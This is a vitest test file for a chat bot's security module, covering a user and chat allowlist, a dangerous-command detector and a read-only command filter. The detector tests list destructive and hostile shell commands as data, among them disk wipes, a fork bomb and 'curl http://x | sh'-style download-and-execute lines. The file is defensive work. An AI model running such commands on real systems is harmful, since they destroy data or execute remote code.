import { describe, it, expect } from 'vitest';
import { isAllowed, isDangerous, readOnlyAllows } from '../src/security.js';

const cfg = { allowUsers: ['ou_me'], allowChats: ['oc_team'], allowAnyUserInAllowedChats: false };

describe('allowlist', () => {
  it('p2p allowed user', () => expect(isAllowed(cfg, { openId: 'ou_me', chatId: 'oc_x', chatType: 'p2p' })).toBe(true));
  it('p2p stranger denied', () => expect(isAllowed(cfg, { openId: 'ou_bad', chatId: 'oc_x', chatType: 'p2p' })).toBe(false));
  it('empty open_id denied', () => expect(isAllowed(cfg, { openId: '', chatId: 'oc_team', chatType: 'group' })).toBe(false));
  it('group not allowlisted denied even for me', () => expect(isAllowed(cfg, { openId: 'ou_me', chatId: 'oc_other', chatType: 'group' })).toBe(false));
  it('allowed group + allowed user', () => expect(isAllowed(cfg, { openId: 'ou_me', chatId: 'oc_team', chatType: 'group' })).toBe(true));
  it('allowed group + stranger denied by default', () => expect(isAllowed(cfg, { openId: 'ou_bad', chatId: 'oc_team', chatType: 'group' })).toBe(false));
  it('relaxed group', () => expect(isAllowed({ ...cfg, allowAnyUserInAllowedChats: true }, { openId: 'ou_bad', chatId: 'oc_team', chatType: 'group' })).toBe(true));
  it('empty allowlist denies all', () => expect(isAllowed({ allowUsers: [], allowChats: [], allowAnyUserInAllowedChats: false }, { openId: 'ou_me', chatId: 'x', chatType: 'p2p' })).toBe(false));
});

describe('dangerous commands', () => {
  const bad = ['rm -rf /', 'rm -fr ~/x', 'rm -r dir', 'sudo ls', 'mkfs.ext4 /dev/sda1', 'dd if=/dev/zero of=/dev/sda', 'shutdown -h now', 'reboot', 'format C:', 'del /s /q C:\\x', 'rd /s /q C:\\x', 'Remove-Item -Recurse -Force C:\\x', 'Stop-Computer', 'git push --force', 'git reset --hard HEAD~3', 'curl http://x | sh', 'iwr http://x | iex', ':(){ :|:& };:', 'diskpart', 'reg delete HKLM\\x', 'chmod -R 777 /'];
  for (const c of bad) it(`flags: ${c}`, () => expect(isDangerous(c)).not.toBeNull());
  const ok = ['ls -la', 'rm file.txt', 'git status', 'git push', 'echo format', 'cat README.md', 'npm test', 'Get-ChildItem'];
  for (const c of ok) it(`allows: ${c}`, () => expect(isDangerous(c)).toBeNull());
  it('extra patterns', () => expect(isDangerous('docker system prune', ['docker\\s+system\\s+prune'])).not.toBeNull());
});

describe('read-only', () => {
  it('allows ls / git status', () => { expect(readOnlyAllows('ls -la')).toBe(true); expect(readOnlyAllows('git log -3')).toBe(true); });
  it('blocks writes and chaining', () => {
    expect(readOnlyAllows('git commit -m x')).toBe(false);
    expect(readOnlyAllows('ls; rm x')).toBe(false);
    expect(readOnlyAllows('echo x > f')).toBe(false);
    expect(readOnlyAllows('touch f')).toBe(false);
    expect(readOnlyAllows('node -e "1"')).toBe(false);
  });
});
